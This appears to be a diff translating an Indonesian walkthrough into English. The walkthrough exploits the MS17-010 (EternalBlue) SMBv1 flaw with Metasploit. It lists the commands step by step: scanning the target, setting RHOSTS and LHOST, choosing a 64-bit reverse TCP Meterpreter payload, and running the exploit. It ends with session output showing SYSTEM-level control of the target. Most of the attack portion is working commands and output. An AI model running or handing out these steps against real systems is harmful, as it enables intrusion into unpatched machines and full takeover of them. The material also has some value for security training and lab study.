@@ -1,56 +1,65 @@
-# Walkthrough: Eksploitasi MS17-010 (EternalBlue)
+# Walkthrough: Exploiting MS17-010 (EternalBlue)
 
-Dokumen ini menjelaskan langkah-langkah untuk mengeksploitasi kerentanan SMBv1 pada sistem Windows menggunakan modul EternalBlue di Metasploit.
+This document describes the steps to exploit the SMBv1 vulnerability on Windows systems using the EternalBlue module in Metasploit.
 
-**Target**: Mesin Windows 7 / Windows Server 2008 R2 (tanpa patch keamanan MS17-010)
-**Tujuan**: Mendapatkan akses shell Meterpreter dengan hak akses SYSTEM.
+**Target**: A Windows 7 / Windows Server 2008 R2 machine (without the MS17-010 security patch)
+**Objective**: To obtain a Meterpreter shell with SYSTEM privileges.
 
----
+-----
 
-### Tahap 1: Persiapan dan Pengecekan
+### Phase 1: Preparation and Scanning
 
-Pastikan Anda berada di jaringan yang sama dengan target. Pertama, kita akan memverifikasi apakah target rentan menggunakan modul *scanner* auxiliary.
+Ensure you are on the same network as the target. First, we will verify if the target is vulnerable using an auxiliary scanner module.
 
-1.  **Jalankan Metasploit**
+1.  **Launch Metasploit**
+
     ```bash
     msfconsole
     ```
 
-2.  **Cari dan Gunakan Modul Scanner**
+2.  **Search for and Use the Scanner Module**
+
     ```
     msf6 > search ms17-010
     msf6 > use auxiliary/scanner/smb/smb_ms17_010
     ```
 
-3.  **Atur Opsi**
-    Ganti `192.168.1.10` dengan IP address target Anda.
+3.  **Set Options**
+    Replace `192.168.1.10` with your target's IP address.
+
     ```
     msf6 auxiliary(scanner/smb/smb_ms17_010) > set RHOSTS 192.168.1.10
     msf6 auxiliary(scanner/smb/smb_ms17_010) > run
     ```
 
-4.  **Analisis Hasil**
-    Jika output menunjukkan `Host is likely VULNERABLE to MS17-010`, Anda bisa melanjutkan ke tahap eksploitasi.
+4.  **Analyze the Results**
+    If the output indicates `Host is likely VULNERABLE to MS17-010`, you can proceed to the exploitation phase.
 
-### Tahap 2: Eksploitasi
+### Phase 2: Exploitation
 
-Sekarang kita akan menggunakan modul exploit untuk mendapatkan akses.
+Now we will use the exploit module to gain access.
 
-1.  **Gunakan Modul Exploit**
+1.  **Use the Exploit Module**
+
     ```
     msf6 > use exploit/windows/smb/ms17_010_eternalblue
     ```
 
-2.  **Lihat Opsi yang Diperlukan**
+2.  **View the Required Options**
+
     ```
     msf6 exploit(windows/smb/ms17_010_eternalblue) > show options
     ```
-    Kita perlu mengatur `RHOSTS` dan `LHOST`.
 
-3.  **Atur Opsi Exploit**
-    * `RHOSTS`: IP address mesin target.
-    * `LHOST`: IP address mesin Anda (mesin penyerang).
-    * `PAYLOAD`: Kita akan menggunakan Meterpreter reverse TCP 64-bit.
+    We need to set `RHOSTS` and `LHOST`.
+
+3.  **Set the Exploit Options**
+
+      * `RHOSTS`: The IP address of the target machine.
+      * `LHOST`: The IP address of your machine (the attacking machine).
+      * `PAYLOAD`: We will use the 64-bit Meterpreter reverse TCP payload.
+
+    <!-- end list -->
 
     ```
     msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 192.168.1.10
@@ -58,24 +67,23 @@ Sekarang kita akan menggunakan modul exploit untuk mendapatkan akses.
     msf6 exploit(windows/smb/ms17_010_eternalblue) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
     ```
 
-4.  **Jalankan Exploit**
+4.  **Run the Exploit**
+
     ```
     msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit
     ```
 
-### Tahap 3: Pasca-Eksploitasi
+### Phase 3: Post-Exploitation
 
-Jika berhasil, Anda akan melihat pesan `WIN` dan sesi Meterpreter akan terbuka.
+If successful, you will see a `WIN` message and a Meterpreter session will open.
 
 [] Sending encoded stage (206403 bytes) to 192.168.1.10
-[] Meterpreter session 1 opened (10.10.10.1:4444 -> 192.168.1.10:49157) at ...
+[] Meterpreter session 1 opened (10.10.10.1:4444 -\> 192.168.1.10:49157) at ...
 
-meterpreter >
+meterpreter \>
 
+You now have full control over the target machine. Verify your access rights:
+meterpreter \> getuid
+Server username: NT AUTHORITY\\SYSTEM
 
-Anda sekarang memiliki kontrol penuh atas mesin target. Verifikasi hak akses Anda:
-meterpreter > getuid
-Server username: NT AUTHORITY\SYSTEM
-
-
-**Walkthrough selesai.**
+**Walkthrough complete.**
